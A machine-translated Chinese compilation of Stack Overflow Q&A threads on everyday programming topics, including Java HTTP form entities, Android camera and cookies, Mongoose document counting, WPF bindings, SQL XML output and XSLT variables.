如果这不起作用，请尝试[`Press Keys`](https://robotframework.org/SeleniumLibrary/SeleniumLibrary.html#Press%20Keys)直接键入输入的路径。

# java - 我们如何在 UrlEncodedFormEntity.. 中传递 HashMap 参数？

> ID：10811843
> 
> 赞同：0
> 
> 时间：2012-05-30T07:30:57.120
> 
> 标签：java, android

我们如何传递`HashMap`参数`UrlEncodedFormEntity`？或如何解决？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T07:36:45.763

我假设你的意思是这样的：

```
HashMap<String, String> values = ....;
ArrayList<NameValuePair> parameters = new ArrayList<NameValuePair>();
for (Map.Entry<String, String> entry : values.entrySet()) {
    parameters.add(new BasicNameValuePair(entry.getKey(), entry.getValue()));
}
UrlEncodedFormEntity entity = new UrlEncodedFormEntity(parameters); 
```

**编辑**#2：

如果您`HashMap`持有任意值，请记住改为：

```
HashMap<String, Object> map = ....; // Your map goes here
ArrayList<NameValuePair> parameters = new ArrayList<NameValuePair>();
for (Map.Entry<String, ?> entry : map.entrySet()) {
    Object value = entry.getValue();
    if (value instanceof Collection) {
        Collection<?> values = (Collection<?>) value;
        for (Object v : values) {
            // This will add a parameter for each value in the Collection/List
            parameters.add(new BasicNameValuePair(entry.getKey(), v == null ? null : String.valueOf(v)));
        }
    } else {
        parameters.add(new BasicNameValuePair(entry.getKey(), value == null ? null : String.valueOf(value));
    }
}
UrlEncodedFormEntity entity = new UrlEncodedFormEntity(parameters); 
```

# android - 在 IC 中，无法获取 cookie

> ID：10811848
> 
> 赞同：0
> 
> 时间：2012-05-30T07:31:20.240
> 
> 标签：android, cookies, session-cookies, android-4.0-ice-cream-sandwich, httpurlconnection

cookie 总是返回 null...

在 android 2.x 这很好用，但 4.0.4 ICS 不工作

```
ConnectivityManager manager = (ConnectivityManager) mContext
            .getSystemService(Context.CONNECTIVITY_SERVICE);
CookieManager cookie = CookieManager.getInstance();

            if(cookie.getCookie(mContext.getString(R.string.host_url))!=null){
                conn.setRequestProperty("Cookie", cookie.getCookie(mContext.getString(R.string.host_url)));
                Log.d("tag", "cookie get " +  cookie.getCookie(mContext.getString(R.string.host_url)));
            } 
```

在这段代码中 cookie.getCookie() 总是返回 null ...

*在 HttpUrlConnection 中使用此代码

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-27T22:19:23.233

尝试在网址前添加一个点。例如，如果它是“domain.com”，请将其更改为“.domain.com”，但它仍然不适用于以前的版本。因此，请检查版本并执行其他操作。4.0 之前的所有版本都适用于“domain.com”

# iphone - asp.net Webservice 返回 XML 而不是 JSON

> ID：10811851
> 
> 赞同：-2
> 
> 时间：2012-05-30T07:31:36.510
> 
> 标签：iphone, asp.net, ios, xcode, web-services

我正在为我的 iPhone 应用程序编写一个网络服务。Web 服务应该以 JSON 格式返回“HelloWorld”，但它返回 XML。我不知道为什么

我有以下网络服务

```
 [ScriptService]
    public class Service1 : System.Web.Services.WebService
    {

        [ScriptMethod(ResponseFormat = ResponseFormat.Json)]
        [WebMethod]
        public string HelloWorld()
        {
            return "HelloWorld";
        }
    } 
```

并在 Xcode 中关注

```
- (IBAction)parseButton:(id)sender {

NSString *urlString = @"http://217.160.223.254/Webdienst2/Service1.asmx/HelloWorld";

NSURL *url = [NSURL URLWithString:urlString];

NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];

[request setHTTPMethod: @"POST"];
[request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];

NSError *errorReturned = nil;
NSURLResponse *theResponse =[[NSURLResponse alloc]init];
NSData *data = [NSURLConnection sendSynchronousRequest:request returningResponse:&theResponse error:&errorReturned];

if (errorReturned) 
{
    NSLog(@"Error");
}
else 
{
    NSString *retVal = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];  

    NSLog(@"%@", retVal);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:34:17.633

尝试将 Content-Type 请求标头设置为`application/json`：

```
[request setHTTPMethod: @"POST"];
[request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
NSError *errorReturned = nil; 
```

# ruby-on-rails - 使用活动管理员进行范围界定 cancan

> ID：10811853
> 
> 赞同：2
> 
> 时间：2012-05-30T07:31:38.040
> 
> 标签：ruby-on-rails, cancan, activeadmin

我如何在活动管理员和 cancan 中使用范围。我有管理员用户并且那些与机构有（has_one）关系并且机构有很多配置文件现在当管理员用户登录时，我想显示所有具有相同机构的配置文件。

发现以下链接没有多大帮助。

[http://activeadmin.info/docs/2-resource-customization.html#scoping_the_queries](http://activeadmin.info/docs/2-resource-customization.html#scoping_the_queries)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T08:04:46.687

如果你只是这样做，你会遇到问题吗？

```
# ability.db

def initialize(user)
  case
    # ...
    when user.super_admin?
      can :manage, :all
    when user.admin?
      can :manage, Profile, :institution_id => user.institution.id
    # 
    # ...
end 
```

这将允许: `Profile.accessible_by(current_user)`，这里与`current_user.profiles`

```
class AdminUser
  has_one :institution
  has_many :profiles, :through => :institution
end

ActiveAdmin.register Profile do
  scope_to :current_user #here comes the variable which set in initializer
end 
```

如果您希望超级管理员访问所有帖子，可以使用 :association_method 选项

```
ActiveAdmin.register Profile do
  scope_to :current_user, :association_method => :admin_profiles
end 

# in class User
def admin_profiles
  if super_admin?
    Profile.unscoped
  else
    profiles
  end
end 
```

一个棘手的解决方案可以概括这一点，并使用委托类作为代理来取消超级管理员的所有模型的范围。我可以根据要求拼出。

# sql - 在 FOR XML AUTO 模式下为 XML 标签添加前缀

> ID：10811859
> 
> 赞同：1
> 
> 时间：2012-05-30T07:31:57.517
> 
> 标签：sql, sql-server, xml

我想知道是否可以`TAG PREFIX`在模式结果中的每个 ELEMENT TAG 之前添加`FOR XML AUTO`。

我知道`RAW`模式是可能的，但我需要将其作为层次结构尽可能 xml 结果

像这样的东西：

```
 <prefix:attName>
        <prefix:ID>value</prefix:ID>
        <prefix:name>value</prefix:name>
      </prefix:attName> 
```

模式下的查询`RAW`将是这样的：

```
SELECT ID, 
      Name,
FROM TableName 
FOR XML RAW ('prefix'), ROOT('prefix:attName'), ELEMENTS 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T07:53:22.603

您可以使用别名来实现此目的：

```
WITH XMLNAMESPACES ('prefix' AS prefix)
SELECT  ID AS [prefix:ID], 
        Name AS [prefix:Name]
FROM    TableName AS [prefix:attName]
FOR XML AUTO, ROOT('prefix:attName'), ELEMENTS 
```

# multithreading - “非阻塞”数据结构如何可能？

> ID：10811862
> 
> 赞同：7
> 
> 时间：2012-05-30T07:32:04.210
> 
> 标签：multithreading, algorithm, data-structures, language-agnostic, nonblocking

我无法理解任何数据结构如何“非阻塞”。

假设您正在制作一个“非阻塞”哈希表。在某些时候，您的哈希表太满了，因此您必须重新哈希到一个更大的表中。

这意味着您需要分配内存，这是一种全局资源。所以看起来你*必须*获得某种锁来防止堆的全局损坏......不管你的数据结构本身可能存在的问题！
但这意味着在您分配内存时，所有其他线程都必须阻塞......

我在这里想念什么？
（如何）你能在不阻塞另一个做同样事情的线程的情况下分配内存吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T07:41:15.787

非阻塞设计的两个例子是[乐观设计](http://en.wikipedia.org/wiki/Optimistic_concurrency_control)和[事务性内存](http://en.wikipedia.org/wiki/Transactional_memory)。

这样做的想法是——在大多数情况下，阻塞是多余的——因为两个 OP 可以同时发生而不会相互中断。但是，有时当 2 个 OP 同时发生并且数据因此而损坏时 - 您可以回滚到以前的状态，然后重试。

这些设计中可能仍然存在锁定，但数据锁定的*时间*明显更短，并且仅限于 OP 影响发生的关键时间。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-30T07:54:08.063

只是为了一些定义，附加信息以及区分**non-blocking**，**lock-free**和**wait-free**术语，我建议阅读以下文章（我不会在这里复制相关段落，因为它太长了）：

[非阻塞、无锁和无等待的定义](http://www.justsoftwaresolutions.co.uk/threading/non_blocking_lock_free_and_wait_free.html)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-30T15:29:05.013

大多数策略都有一个共同的基本模式。他们在循环中使用[比较和交换 (CAS)](http://en.wikipedia.org/wiki/Compare-and-swap)操作，直到成功。

例如，让我们考虑一个用链表实现的堆栈。我选择了链表实现，因为它很容易与 CAS 并发，但还有其他方法可以做到这一点。我将使用类似 C 的伪代码。

```
Push(T item)
{
  Node node = new Node(); // allocate node memory
  Node initial;
  do
  {
    initial = head;
    node.Value = item;
    node.Next = initial;
  }
  while (CompareAndSwap(head, node, initial) != initial);
}

Pop()
{
  Node node;
  Node initial;
  do
  {
    initial = head;
    node = initial.Next;
  }
  while (CompareAndSwap(head, node, initial) != initial);
  T value = initial.Value;
  delete initial; // deallocate node memory
  return value;
} 
```

在上面的代码`CompareAndSwap`中是一个非阻塞的原子操作，它将内存地址中的值替换为新值并返回旧值。如果旧值与预期值不匹配，那么您将通过循环并再次尝试。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-30T07:46:51.513

所有这些[非阻塞](http://en.wikipedia.org/wiki/Non-blocking_algorithm)意味着你永远不会无限期地等待，而不是你永远不会等待。只要您的堆也是使用非阻塞算法实现的，您就可以在它之上实现其他非阻塞算法。

# android - 对于相机应用，SurfaceView 在前景时变黑

> ID：10811864
> 
> 赞同：1
> 
> 时间：2012-05-30T07:32:19.303
> 
> 标签：android, android-camera, android-capture

我在我的应用程序中使用相机功能。一切正常，但是当设备被锁定/睡眠时，返回应用程序后，相机部分（SurfaceView）只是黑色的。下面是我的代码。有人可以找出问题吗？

```
public class Activity_Camera extends Activity implements SurfaceHolder.Callback, Camera.AutoFocusCallback, Observer
{
    // Surface vars
    private SurfaceView preview;
    private SurfaceHolder previewHolder;

    // Camera vars
    private Camera mCamera;
    private boolean mPreviewRunning = false;
    private boolean mCaptureFrame = false;
    private int frame_number = 1;
    private byte[] frame = new byte[1];

    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        preview = (SurfaceView) findViewById(R.id.preview);
        previewHolder = preview.getHolder();
        previewHolder.addCallback(this);
        previewHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
    }

    @Override
    public void onPause()
    {
        super.onPause();
        if (mPreviewRunning)
                 {
                     mCamera.stopPreview();
                     mPreviewRunning = false;
                 }
                 mCamera.setPreviewCallback(null); 
                 mCamera.release();
    }

    // implements SurfaceHolder.Callback
    public void surfaceCreated(SurfaceHolder holder)
    {
        mCamera = Camera.open();
    }

    // implements SurfaceHolder.Callback
    public void surfaceDestroyed(SurfaceHolder holder)
    {
        mPreviewRunning = false;
    }

    // implements Camera.AutoFocusCallback
    public void onAutoFocus(boolean success, Camera camera)
    {

    }

    PreviewCallback previewCallback = new PreviewCallback()
    {
        public void onPreviewFrame(byte[] data, Camera camera)
        {

        }
    };

    // implements SurfaceHolder.Callback
    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height)
    {
        if (mPreviewRunning)
        {
            mCamera.stopPreview();
        }

        Camera.Parameters p = mCamera.getParameters();
        p.setPreviewSize(640, 480);
        mCamera.setParameters(p);

        try
        {
            mCamera.setPreviewDisplay(holder);
        } catch (IOException e)
        {
            e.printStackTrace();
        }

        mCamera.setPreviewCallback(previewCallback);

        int rotation = getWindowManager().getDefaultDisplay().getRotation();
        int degrees = 0;
        switch (rotation)
        {
        case Surface.ROTATION_0:
            degrees = 90;
            break;
        case Surface.ROTATION_90:
            degrees = 0;
            break;
        case Surface.ROTATION_180:
            degrees = 270;
            break;
        case Surface.ROTATION_270:
            degrees = 180;
            break;

        }
        Log.i("DEGREES ARE WHAT??", Integer.toString(degrees));

//      mCamera.setDisplayOrientation(degrees);
        mCamera.setDisplayOrientation(90);

        mCamera.startPreview();
        mPreviewRunning = true;

    }

    // implements Observer
    // captures a frame when the compass listener says it is appropriate
    public void update(Observable observable, Object data)
    {
        mCaptureFrame = true;
    }
} 
```

请找出问题所在，因为我怀疑 onPause() 有问题，当我在黑色相机屏幕后按下返回按钮时，它也会给我异常：

```
java.lang.RuntimeException: Method called after release() 
```

在这条线上：

```
 mCamera.setPreviewCallback(null); // (in onPause()) 
```

这是 XML：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical"
    android:background="#E6E5E6">
    <LinearLayout 
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:gravity="center_horizontal">
        <TextView 
            android:id="@+id/tv_camera_url"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:maxLines="1"
            android:textColor="@android:color/black"
            android:text="URL goes here........"
            android:layout_marginTop="3dp"
            android:textStyle="bold"/>
        <TextView 
            android:id="@+id/tv_speaknow"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:padding="3dp"
            android:background="#ffffff"
            android:layout_marginTop="3dp"
            android:text="Speak Now"
            android:textColor="#ff0000"
            android:textStyle="bold"/>
    </LinearLayout>
    <RelativeLayout
        android:id="@+id/rl_main"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content">
        <SurfaceView
            android:id="@+id/preview"
            android:layout_width="480px"
            android:layout_height="640px"
            android:layout_alignParentBottom="true"/>
        <Button
            android:id="@+id/btn_take_picture"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:background="@drawable/camera"
            android:layout_alignBottom="@+id/preview"
            android:layout_centerHorizontal="true"
            android:layout_marginBottom="5dp"/>
    </RelativeLayout>
</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:47:18.597

如果它是您第一次启动应用程序，onPause 真的不应该是问题。但我会将创建等移至 onResume 而不是 onCreate。

我可以看到你的surfaceview xml吗？

你只想要一张照片吗？

if (mPreviewRunning) { mCamera.stopPreview(); }

而大多数人从 onResume 开始预览。试着把它移到那里..

# java - Mysql-插入长BLOB

> ID：10811878
> 
> 赞同：0
> 
> 时间：2012-05-30T07:32:53.830
> 
> 标签：java, mysql

在我的服务器中 max_allowed_pa​​cket 值为 16mb，我无法更改服务器配置。我想插入一个大约 25mb 的文件。如何将文件插入 mysql blob？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:37:06.120

如果您真的无法将`max_allowed_packet_value`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:47:53.880

将文件分成几部分并尝试将其保存为两列。

# c# - 维护控件之间的子/父关系

> ID：10811881
> 
> 赞同：1
> 
> 时间：2012-05-30T07:33:22.803
> 
> 标签：c#, user-interface, user-controls, polymorphism, parent-child

我正在编写一个 WP7 GUI 并设计了一个 Control 类，以及一个从 Control 派生并具有子控件列表的 ParentControl 类。但是，当将子项添加到 ParentControl 实例时，我无法访问子项的父引用，因为我将其设置为不受控件用户的“保护”。

**确切的错误是**

* * *

*“无法通过 'Control' 类型的限定符访问受保护的成员 'Control.Parent'；
限定符必须是 'ParentControl' 类型（或派生自它）”*

* * *

```
 public abstract class Control //such as a button or radio button
    {
        public ParentControl Parent { get; protected set; }
    }

    public abstract class ParentControl : Control //such as a panel or menu
    {
        protected List<Control> children = new List<Control>();;

        public void AddChild(Control child, int index)
        {
            NeedSizeUpdate = true;

            if (child.Parent != null)
                child.Parent.RemoveChild(child);
            child.Parent = this; //How do I access the parent?
            children.Insert(index, child);

            OnChildAdded(index, child);
        }
    } 
```

* * *

**我该如何解决这个问题？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T08:03:17.800

是的，这是因为其他东西可能派生自`Control`，并且`ParentControl`只能访问它派生自的控件的基本成员。例如，如果`Control2`派生自`Control`，则`ParentControl`不会派生自`Control2`，因此无法访问它的基成员。

因此，您可以创建`Parent`一个公共属性，或者如果您想让它远离控件的一般用户，您可以通过接口进行访问，并显式实现它：

```
interface IChildControl
{
    ParentControl Parent { get; set; }
}

public abstract class Control : IChildControl //such as a button or radio button
{
    ParentControl IChildControl.Parent { get; set; }
} 
```

显式实现 ( `IChildControl.Parent`) 意味着只有一个`Control`实例的消费者不会看到该`Parent`属性。它必须显式转换为`IChildControl`才能访问它。

# wpf - Caliburn Micro：DataGrid 中 ComboBox 的 ElementName 不起作用

> ID：10811886
> 
> 赞同：0
> 
> 时间：2012-05-30T07:33:41.143
> 
> 标签：wpf, xaml, combobox, caliburn.micro, elementname

我的问题是 DataGrid 中 ComboBox 的 ItemsSource 没有绑定。我的用户控件：

```
<UserControl x:Class="MyClass"
             x:Name="Root"
             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
             xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
             xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
             xmlns:cal="clr-namespace:Caliburn.Micro;assembly=Caliburn.Micro" 
             mc:Ignorable="d" 
             d:DesignHeight="360" d:DesignWidth="757"> 
```

数据网格：

```
 <DataGrid x:Name="Article" 
              AutoGenerateColumns="False"
              SelectionUnit="FullRow" 
              SelectionMode="Single"
              CanUserAddRows="False" 
              CanUserDeleteRows="True"
              Grid.Row="0" Grid.Column="0" Grid.ColumnSpan="4"
              Margin="5">
        <DataGrid.Columns>
            <DataGridTemplateColumn Width="*"
                                    Header="Article">
                <DataGridTemplateColumn.CellEditingTemplate>
                    <DataTemplate>
                        <ComboBox ItemsSource="{Binding FilteredArticle, ElementName=Root}"                                      IsEditable="True" 
                                  cal:Message.Attach="[Event KeyUp] = [Action FindArticlel($source)]" />
                    </DataTemplate>
                </DataGridTemplateColumn.CellEditingTemplate>
            </DataGridTemplateColumn> 
```

如果我不说 ElementName=Root，他会尝试在 Article 类中绑定 FilteredArticle。如果我说 ElementName=Root，他会在运行时说以下内容：

```
System.Windows.Data Error: 4 : Cannot find source for binding with reference 'ElementName=Root'. BindingExpression:Path=FilteredArticle; DataItem=null; target element is 'ComboBox' (Name=''); target property is 'ItemsSource' (type 'IEnumerable') 
```

FilteredArticle 是我的 ViewModel 中的 BindableCollection。所有其他绑定都在工作。这里有什么问题？使用最新稳定版本的 Caliburn.Micro。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T09:21:32.357

通过绑定到视图`ElementName`通常是一种不好的做法。主要是因为创建视图实例的人可以给它一个不同的`x:Name`，这会破坏你的内部绑定。

另外，该`FilteredArticle`属性不是视图的属性，而是视图模型的属性，视图模型是视图的数据上下文。

在这些场景中使用相对源进行绑定

```
ItemsSource="{Binding DataContext.FilteredArticle, 
                      RelativeSource={RelativeSource FindAncestor, 
                                             AncestorType={x:Type UserControl}}}" 
```

您可以使用更具体的符号（尽管在 99% 的情况下没有必要）

```
ItemsSource="{Binding DataContext.FilteredArticle, 
                      RelativeSource={RelativeSource FindAncestor, 
                                             AncestorType={x:Type local:MyClass}}}" 
```

`local`的`xmlns`命名空间在哪里`MyClass`

# node.js - 如何获得猫鼬模型的所有计数？

> ID：10811887
> 
> 赞同：127
> 
> 时间：2012-05-30T07:33:42.940
> 
> 标签：node.js, mongodb, mongoose

我如何知道已保存数据的模型的数量？有一种方法`Model.count()`，但它似乎不起作用。

```
var db = mongoose.connect('mongodb://localhost/myApp');
var userSchema = new Schema({name:String,password:String});
userModel =db.model('UserList',userSchema);        
var userCount = userModel.count('name'); 
```

`userCount`是一个对象，调用哪个方法可以得到一个真实的`count`？

***谢谢***

* * *

## 回答 #1

> 赞同：164
> 
> 时间：2013-03-26T12:14:45.783

您的代码不起作用的原因是 count 函数是异步的，它不会同步返回值。

这是一个使用示例：

```
userModel.count({}, function( err, count){
    console.log( "Number of users:", count );
}) 
```

* * *

## 回答 #2

> 赞同：151
> 
> 时间：2012-05-30T10:22:18.360

下面的代码有效。注意[countDocuments](https://mongoosejs.com/docs/api.html#model_Model.countDocuments)的使用。

```
 var mongoose = require('mongoose');
 var db = mongoose.connect('mongodb://localhost/myApp');
 var userSchema = new mongoose.Schema({name:String,password:String});
 var userModel =db.model('userlists',userSchema);
 var anand = new userModel({ name: 'anand', password: 'abcd'});
 anand.save(function (err, docs) {
   if (err) {
       console.log('Error');
   } else {
       userModel.countDocuments({name: 'anand'}, function(err, c) {
           console.log('Count is ' + c);
      });
   }
 }); 
```

* * *

## 回答 #3

> 赞同：37
> 
> 时间：2017-04-25T07:10:08.660

你应该给一个对象作为参数

```
userModel.countDocuments({name: "sam"}); 
```

或者

```
userModel.countDocuments({name: "sam"}).exec(); //if you are using promise 
```

或者

```
userModel.countDocuments({}); // if you want to get all counts irrespective of the fields 
```

对于旧版本的猫鼬，请使用

```
userModel.count({name: "sam"}); 
```

* * *

## 回答 #4

> 赞同：29
> 
> 时间：2018-08-18T00:55:29.440

collection.count 已弃用，并将在未来版本中删除。使用收藏。**countDocuments**或集合。而是**估计的DocumentCount。**

```
userModel.countDocuments(query).exec((err, count) => {
    if (err) {
        res.send(err);
        return;
    }

    res.json({ count: count });
}); 
```

* * *

## 回答 #5

> 赞同：22
> 
> 时间：2018-10-31T14:21:06.277

# 解决方案的背景

正如猫鼬文档和本杰明的回答中所述，该方法[`Model.count()`](https://mongoosejs.com/docs/api.html#model_Model.count)已被弃用。代替 using `count()`，替代方案如下：

**[`Model.countDocuments(filterObject, callback)`](https://mongoosejs.com/docs/api.html#model_Model.countDocuments)**

计算有多少文档与集合中的过滤器匹配。传递一个空对象 {} 作为过滤器会执行完整的集合扫描。如果集合很大，可以使用以下方法。

**[`Model.estimatedDocumentCount()`](https://mongoosejs.com/docs/api.html#model_Model.estimatedDocumentCount)**

此模型方法估计 MongoDB 集合中的文档数。这种方法比以前的方法更快`countDocuments()`，因为它使用集合元数据而不是遍历整个集合。但是，正如方法名称所暗示的那样，并且根据数据库配置，结果是估计值，因为元数据可能无法反映方法执行时刻集合中文档的实际数量。

两种方法都返回一个 mongoose 查询对象，可以通过以下两种方式之一执行。`.exec()`如果您想稍后执行查询，请使用。

# 解决方案

## 选项 1：传递回调函数

例如，使用以下方法计算集合中的所有文档`.countDocuments()`：

```
someModel.countDocuments({}, function(err, docCount) {
    if (err) { return handleError(err) } //handle possible errors
    console.log(docCount)
    //and do some other fancy stuff
}) 
```

或者，使用以下方法计算集合中具有特定名称的所有文档`.countDocuments()`：

```
someModel.countDocuments({ name: 'Snow' }, function(err, docCount) {
    //see other example
} 
```

## 选项 2：使用`.then()`

mongoose查询具有`.then()`“thenable”。这是为了方便，查询本身并不是一个承诺。

例如，使用以下方法计算集合中的所有文档`.estimatedDocumentCount()`：

```
someModel
    .estimatedDocumentCount()
    .then(docCount => {
        console.log(docCount)
        //and do one super neat trick
    })
    .catch(err => {
        //handle possible errors
    }) 
```

## 选项 3：使用 async/await

当使用 async/await 方法时，[推荐](https://mongoosejs.com/docs/promises.html#should-you-use-exec-with-await?)的方法是使用它，`.exec()`因为它提供了更好的堆栈跟踪。

```
const docCount = await someModel.countDocuments({}).exec(); 
```

*通过stackoverflow学习，*

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2020-08-27T07:49:44.807

使用 mongoose.js 你可以统计文档，

*   全部计算

```
const count = await Schema.countDocuments(); 
```

*   具体计数

```
const count = await Schema.countDocuments({ key: value }); 
```

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2020-01-02T05:34:22.600

这里投票最高的答案非常好我只想加起来**await**的使用，以便可以实现所要求的功能：

```
const documentCount = await userModel.count({});
console.log( "Number of users:", documentCount ); 
```

建议使用**countDocuments()**而不是 'count()'，因为它将被弃用。所以，就目前而言，完美的代码是：

```
const documentCount = await userModel.countDocuments({});
console.log( "Number of users:", documentCount ); 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2022-02-05T04:06:06.703

`Model.count()`方法在 mongoose 版本 6.2.0 中已弃用。如果要计算集合中的文档数，例如`count({})`，请改用该`estimatedDocumentCount()`函数。否则，请改用该`countDocuments()`功能。

`Model.estimatedDocumentCount()`估计 MongoDB 集合中的文档数。它比`countDocuments()`用于大型集合更快，因为estimatedDocumentCount() 使用集合元数据而不是扫描整个集合。

例子：

```
const numAdventures = await Adventure.estimatedDocumentCount(); 
```

参考：[https ://mongoosejs.com/docs/api.html#model_Model.estimatedDocumentCount](https://mongoosejs.com/docs/api.html#model_Model.estimatedDocumentCount)

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2014-07-17T16:07:41.227

如前所述，您的代码将无法正常工作。解决方案是使用回调函数，但如果您认为它会将您带入“回调地狱”，您可以搜索“Promises”。

使用回调函数的可能解决方案：

```
//DECLARE  numberofDocs OUT OF FUNCTIONS
     var  numberofDocs;
     userModel.count({}, setNumberofDocuments); //this search all DOcuments in a Collection 
```

如果要根据查询搜索文档数，可以这样做：

```
 userModel.count({yourQueryGoesHere}, setNumberofDocuments); 
```

setNumberofDocuments 是一个单独的函数：

```
var setNumberofDocuments = function(err, count){ 
        if(err) return handleError(err);

        numberofDocs = count;

      }; 
```

现在您可以使用 getFunction 在任何地方获取文档的数量：

```
 function getNumberofDocs(){
           return numberofDocs;
        }
 var number = getNumberofDocs(); 
```

此外，您可以通过回调在同步函数中使用此异步函数，例如：

```
function calculateNumberOfDoc(someParameter, setNumberofDocuments){

       userModel.count({}, setNumberofDocuments); //this search all DOcuments in a Collection

       setNumberofDocuments(true);

} 
```

# joomla - 在 joomla 中使用自定义 javascript 代码

> ID：10811891
> 
> 赞同：0
> 
> 时间：2012-05-30T07:34:10.070
> 
> 标签：joomla

我被要求编写自定义 javascript 来创建工具提示。我已经这样做了，代码可以在我的本地主机和我自己的在线虚拟主机上运行，​​但它拒绝在 joomla 2.5 中运行。我听说这可能是由 joomla 本身附带的 moo 工具插件引起的？我应该安装什么插件才能使我的 javascript 工作？我检查了代码，它可以正常工作。如果这是一个不恰当的问题，我深表歉意。

编辑：问题是它根本不会运行代码。它不应用CSS。它是从另一个文件加载的，尽管它确实将样式应用于站点的其余部分。当假设标签中的`title`属性有自定义css时，`img`我只会得到一个常规文本窗口

# html - jquery中使用下拉框的小型大写字母

> ID：10811895
> 
> 赞同：-1
> 
> 时间：2012-05-30T07:34:42.797
> 
> 标签：html

我正在使用以下代码，但其中小型大写字母不起作用，请帮助我，查看我在 jquery 中尝试的代码，只有小型大写字母不起作用。我正在使用下拉框。

```
<select id="size" >
  <option value="0">[No Engraving]</option>
  <option value="variant">Small Caps</option>
  <option value="uppercase">All Caps</option>
  <option value=" lowercase">No Caps</option>
  <option value="capitalize">Normal</option>
</select> 
```

您回答的内容实际上在我写入文本框并从下拉菜单中选择任何应该更改文本的文本转换时实际上不起作用，如果我选择所有大写字母，没有大写字母并且正常，它工作得很好，只有小写字母不起作用。 （请记住我在 jquery 中执行所有这些操作。）请检查此链接并让我知道为什么小型大写字母不起作用？美国斜体 bt 也不起作用。

[http://dwfek.hmnjw.servertrust.com/v/vspfiles/assets/images/Engraving%20Demo/jquery1.html](http://dwfek.hmnjw.servertrust.com/v/vspfiles/assets/images/Engraving%20Demo/jquery1.html)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:57:34.913

我想你的代码会有类似的东西（你没有向我们展示那部分）

```
font-variant:small-caps; 
```

但正如我们所看到的，似乎有一个错字，它的**变体**不是**变体**

确保你没有重复那个错字，如果它完全一致

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-05T05:13:23.853

第一件事 - 小型股甚至意味着什么？

我看到了网站和使用的代码。它似乎正在使用 selected 选项和 onchange 将文本的 'text-transform' 属性设置为所选文本的值。

来自 (W3schools)[http://www.w3schools.com/cssref/pr_text_text-transform.asp] 允许的值如下：

```
text-transform: none;
text-transform: capitalize;
text-transform: uppercase;
text-transform: lowercase;
text-transform: inherit; 
```

因此，您的价值“变体”可能不起作用。

# javascript - 如何从字符串中删除最后一个和第一个空格？

> ID：10811896
> 
> 赞同：16
> 
> 时间：2012-05-30T07:34:51.937
> 
> 标签：javascript

> **可能重复：**
> [如何在 javascript 中修剪字符串？](https://stackoverflow.com/questions/498970/how-do-i-trim-a-string-in-javascript)

我只需要从通用字符串中删除最后一个和第一个空格。

例子：

```
var str = " hello world "; // become "hello world"
var str = "ehi, do you come from ? "; // become "ehi, do you come from ?"
var str = "I am from Cina"; // remain "I am from Cina" 
```

我怎样才能做到这一点 ？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-05-30T07:39:36.017

来自 jQuery的[修剪](http://api.jquery.com/jQuery.trim/)是您正在寻找的。

`$.trim(' string with spaces at the ends ');`

或普通的javascript：

`' string with spaces at the ends '.trim()`

# xml - XSLT 如何从 XML 生成动态变量数组？

> ID：10811898
> 
> 赞同：0
> 
> 时间：2012-05-30T07:35:04.593
> 
> 标签：xml, xslt, dynamic

我正在使用 XSLT 将 XML 转换为 HTML。目前我正试图弄清楚如何在 XSLT 中创建一个数组变量。

**这是我的 XML：**

```
<data>
    <ACCOUNTS elem="0">
        <ACCOUNT_NO>12345</ACCOUNT_NO>
    </ACCOUNTS>
    <ACCOUNTS elem="1">
        <ACCOUNT_NO>67890</ACCOUNT_NO>
    </ACCOUNTS>
</data> 
```

**这是我试图弄清楚但不工作的 XSLT：**

```
<xsl:variable name="accounts">
    <xsl:for-each select="data/ACCOUNTS">
        <child elem="<xsl:value-of select='position()' />"><xsl:value-of select="ACCOUNT_NO" /></child>
    </xsl:for-each>
</xsl:variable> 
```

**如何将位置添加到 XML 节点中，以便我能够使用**

```
<xsl:value-of select="$account[@elem=1]" /> 
```

请帮助我，如果有任何疑虑，请告诉我。谢谢。

**更新 ：**

**我的完整 XSLT 代码：**

```
